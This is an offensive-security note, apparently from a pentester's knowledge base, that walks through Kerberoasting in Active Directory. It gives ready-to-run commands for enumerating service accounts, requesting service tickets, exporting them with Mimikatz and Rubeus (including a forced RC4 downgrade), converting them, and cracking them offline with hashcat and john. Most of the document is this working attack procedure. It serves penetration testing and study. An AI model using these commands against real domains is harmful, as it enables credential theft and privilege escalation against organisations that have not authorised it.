---
title: Kerberoasting
draft: false
tags:
  - windows
  - active-directory
  - recon
  - info-gathering
  - active
---
 
> [!Important]
> - If we are performing any of the attacks from a **Linux host**, we are not on a domain-joined computer so we have to **provide credentials**.
> - If we are from a **Windows host** that is domain-joined, we **dont need** to **provide credentials** as the tools will automatically enumerate vulnerable users and obtain their hashes.

Obtain the password hash of an AD account associated with a Service Principal Name (SPN).

In kerberos, when we want to access a service we have to request a Service Ticket to the TGS (AS/KDC/DC) that is encrypted with the password hash of the service account associated with the service we want to access (TGS-REP). No one verifies if the current user we are authenticated as can access the specified service until we send the Service Ticket to the Service we want to access so we can requests Service Tickets to the TGS as long as we are authenticated to the domain.

**SPN**: attribute that ties/maps a service instance to a service user account in whose context the service is running in the AD.

> [!Important]
> The account `krbtgt` is a service account associated to the KDC/AS/DC that is responsible for encrypting and issuing TGT. Password for this user is random making it impossible to crack. Skip this account in the context of kerberoasting.

An authenticated domain user request a Kerberos ticket for an SPN. The retrieved TGT is encrypted with the domain user password hash associated with the SPN. Finally, the password hash can be cracked and provide access to any resource in the domain impersonating the owner. We can also craft service tickets for the service specified in the SPN.

> [!Requirements]
> - Domain user credentials (cleartext or just an NTLM hash if using Impacket)
> - A shell in the context of a domain user account
> - Or SYSTEM level access on a domain-joined host
> - And FQDN of the Domain Controller (so we can query it)

> [!Scenarios]
> - From a non-domain joined Linux host using valid domain user credentials.
> - From a domain-joined Linux host as root after retrieving the keytab file.
> - From a domain-joined Windows host authenticated as a domain user.
> - From a domain-joined Windows host with a shell in the context of a domain account.
> - As SYSTEM on a domain-joined Windows host.
> - From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525\(v=ws.11\)) /netonly.

# Kerberoasting - from Linux

1. Listing SPN Accounts with GetUserSPNs.py:
```bash
$ GetUserSPNs.py -dc-ip DC_IP DOMAIN_FQDN/AD_USER
```

> [!Note]
> We have used valid credentials to authenticate to the DC and enumerate the SPN accounts. This is because we are executing the commands from a non-domain-joined host.

2. Request all TGS tickets:
```bash
$ GetUserSPNs.py -dc-ip DC_IP DOMAIN_FQDN/AD_USER:'PASSWORD' -request -outputfile kerberoastable.hash # request TGS for all users

$ GetUserSPNs.py -dc-ip DC_IP DOMAIN_FQDN/AD_USER:'PASSWORD' -request-user SPN_USER -outputfile SPN_USER.hash # request for a single user
```

> [!Note]
> Tickets are output in a format that can be read by john or hashcat

3. Crack the tickets offline:
```shell
$ hashcat -m 13100 OUTPUT_FILE WORDLIST

$ john OUTPUT_FILE --wordlist=WORDLIST
```

4. Test authentication against Domain Controller:
```shell
$ sudo crackmapexec smb DC_IP -u DOMAIN_ADMIN_USER -p DOMAIN_ADMIN_PASSWORD
```

> [!Note]
> If we have gain domain admin rights, we can authenticate against the DC

---
# Kerberoasting - from Windows

**Manual Way**
1. Enumerate SPNs:
```cmd
C:\> setspn.exe -Q */*
```

2. Request TGS tickets for an account and load them into memory:
```powershell
PS C:\> Add-Type -AssemblyName System.IdentityModel (add .NET class to our PS)
PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "TGS_TICKET"
```

2. Retrive all tickets (optional):
```powershell
PS C:\> setspn.exe -T DOMAIN_FQDN -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

Identify a user account with SPN enabled:
```powershell
PS> powershell -ep bypass
PS> . .\PowerView.ps1
PS> Get-NetUser | where-Object { $_.servicePrincipalName } | fl (find all SPNs that are registerd to an account accross all domains within the forest)
PS> setspn -T research -Q */* (find all SPNs registered to an account)

Alternative:
PS> Get-NetUser -SPN | select samaccountname, serviceprincipalname

Alternative:
PS C:\> Get-Module (list available modules)
PS C:\> Import-Module ActiveDirectory (import AD module if not available)

PS C:\> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName # list kerberoastable accounts: accounts with the ServicePrincipalName populated
```

3. Extracting tickets from memory using Mimikatz:
```cmd
PS> .\mimikatz.exe

mimikatz # base64 /out:true (output tickets on terminal -> this will prevent mimikatz to extract the tickets and write them to files)

mimikatz # kerberos::list /export 
*copy the base64 blob*
```

4. Prepare the base64 blob for cracking (on attack host):
```shell
$ echo "<base64 blob>" |  tr -d \\n 
*copy and paste the output to a file*
```

5. Convert the file into a .kirbi (on attack host):
```shell
$ cat encoded_file | base64 -d > sqldev.kirbi
```

6. Extract the kerberos ticket from the TGS file:
```shell
$ python2.7 kirbi2john.py sqldev.kirbi
```

> [!Note]
> This will create a file called `crack_file`

7. Modify crack_file for hashcat:
```shell
$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

8. Check if file is formatted correctly:
```shell
$ cat sqldev_tgs_hashcat
$krb5tgs$23$*sqldev.kirbi*$813149fb26...
```

9. Crack the password with hashcat:
```shell
$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```

> [!Note]
> If we decide to skip the base64 output with mimikatz and type `mimikatz # kerberos::list /export`, the .kirbi files will be written to disk. In this case we just need to download the files into out attack host and run `kirbi2john.py` directly.

**Option 2**

1. Request a TGS ticket for the specified SPN using Kerberos:
```powershell
PS> klist (review kerberos tickets for current user)
PS> Add-Type -AssemblyName System.IdentityModel (loads the System.IdentityModel into the PS session which contains the KerberosRequestorSecurityToken class which can request TGS for the specified SPN)
PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN" (request an TGS ticket for the specified SPN)
SPN: ops/research.SECURITY.local:1434
PS> klist (we should have one more ticket)
```

2. Crack the password hash from the TGS ticket:
```powershell
PS> . .\Invoke-Mimikatz.ps1
PS> Invoke-Mimikatz -Command '"kerberos::list /export"' (list all kerberos tickets and export them)
PS> ls | select name (display the name of the tickets exported)

PS> python.exe .\kerberoast-Pyhton3\tgsrepcrack.py WORDLIST PATH_TO_TGS_TICKET (crack the password encrypted in the TGS file)
```


**Automated Way** (Recommended)

1. Enumerate SPN accounts:
```powershell
PS C:\> Import-Module .\PowerView.ps1
PS C:\> Get-DomainUser * -spn | select samaccountname
```

2. Target a user and retrieve the TGS ticket in hashcat format:
```powershell
PS C:\> Get-DomainUser -Identity TGS_USER | Get-DomainSPNTicket -Format Hashcat
```

3. Export tickets to CSV for offline processing:
```powershell
PS C:\> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

4. Using Rubeus (recommended):
```powershell
PS C:\> .\Rubeus.exe kerberoast /stats (gather stats like kerberoastable users, encryption types for passwords, last set passwords...)

PS C:\> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap (request tickets for accounts with the admincount attribute set. /nowrap to copy more easy the hash for offline cracking)

PS C:\> .\Rubeus.exe kerberoast /user:SPN_USER /nowrap (kerberoast a specific user)

PS C:\> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast (kerberoast all possible users)

IMPORTANT: downgrade from AES to RC4
PS C:\> .\Rubeus.exe kerberoast /tgtdeleg /user:SPN_USER /nowrap (kerberoast a specific user by requesting an RC4 ticket only, even if AES is the only supported algorythm)

*Copy the hash and paste it into a file for offline cracking*
```

> [!Note]
> `$krb5tgs$23$*` -> RC4 encrypted ticket -> easier to crack
> `$krb5tgs$17$*` -> AES128 encrypted ticket -> difficult to crack
> `$krb5tgs$18$*` -> AES256 encrypted ticket -> difficult to crack

- Cracking hashes:
```shell
$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force (TGS-REP: crack RC4 hash)

$ hashcat -m 18200 rc4_to_crack /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force (AS-REP: crack RC4 hash)

$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force (crack AES256)
```

> [!Note]
> If the SPN runs in the context of a computer account, a [managed service account](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009), or a [group-managed service account](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview), the password will be randomly generated, complex, and 120 characters long, making cracking infeasible. The same for the _krbtgt_ user account which acts as service account for the KDC. Therefore, our chances of performing a successful Kerberoast attack against SPNs running in the context of user accounts is much higher.

> [!Important]
> We can perform AS-REP Roasting and Kerberoasting on different domains by leveraging Domain Trust. Refer to the [[AD Domain Trust Abuse]] module for more information.

